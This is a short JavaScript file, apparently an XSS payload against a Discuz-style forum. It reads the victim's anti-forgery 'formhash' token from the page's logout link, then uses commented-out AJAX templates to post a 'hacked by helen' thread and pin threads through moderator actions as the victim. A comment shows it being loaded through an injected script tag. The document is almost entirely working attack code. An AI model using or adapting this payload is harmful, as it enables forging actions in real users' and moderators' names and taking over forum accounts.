function getHash() {

    for (var i = 0; i < document.links.length; i++) {

        if (document.links[i].href.indexOf("action=logout&formhash=") > 0) {

            hash = document.links[i].href;
            hash = hash.substr(hash.length - 8, hash.length);
            break;
        }
    }

}
x = window.x || {
    request: function() {
        if (window.XMLHttpRequest) {
            var ajax = new XMLHttpRequest()
        } else if (window.ActiveXObject) {
            try {
                var ajax = new ActiveXObject("Msxml2.XMLHTTP")
            } catch (e) {
                try {
                    var ajax = new ActiveXObject("Microsoft.XMLHTTP")
                } catch (e) {}
            }
        }
        return ajax
    },
    handle: function(ajax, callback) {
        ajax.onreadystatechange = function() {
            if (ajax.readyState == 4) {
                if (ajax.status == 200) {
                    callback(ajax.responseText)
                }
            }
        }
    },
    display: function(o) {
        if (typeof(o) == 'object') {
            var str = '';
            for (a in o) {

                str += a + '=' + o[a] + '&';
            }
            str = str.substr(0, str.length - 1);
            return str;
        } else {
            return o;
        }
    },
    get: function(url, callback) {
        ajax = x.request();
        ajax.open('get', url, true);
        ajax.send(null);
        x.handle(ajax, callback)
    },
    post: function(url, content, callback) {
        ajax = x.request();
        ajax.open('post', url, true);
        ajax.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        content = x.display(content);
        ajax.send(content);
        x.handle(ajax, callback)
    },
}


var hash = "";
getHash();

/*发帖操作
x.post("接口地址","formhash="+hash+"&posttime=137756647&wysiwyg=1&subject=%E6%96%B0%E4%BA%BA%E6%8A%A5%E9%81%93TEST&message=%E6%96%B0%E4%BA%BA%E6%8A%A5%E9%81%93TEST+hacked++by+helen&replycredit_extcredits=0&replycredit_times=1&replycredit_membertimes=1&replycredit_random=100&readperm=&price=&tags=test&rushreplyfrom=&rushreplyto=&rewardfloor=&stopfloor=&creditlimit=&save=&adddynamic=true&usesig=1&allownoticeauthor=1"); 
*/
/*置顶帖子  <script  src="http://w/try/1.js"> </script>
x.post("接口地址","frommodcp=&formhash="+hash+"&fid=2&redirect=&listextra=page%3D1&handlekey=mods&moderate[]=12&operations[]=stick&sticklevel=3&expirationstick=&digestlevel=0&expirationdigest=&highlight_color=0&highlight_style[1]=0&highlight_style[2]=0&highlight_style[3]=0&expirationhighlight=&reason=");


*/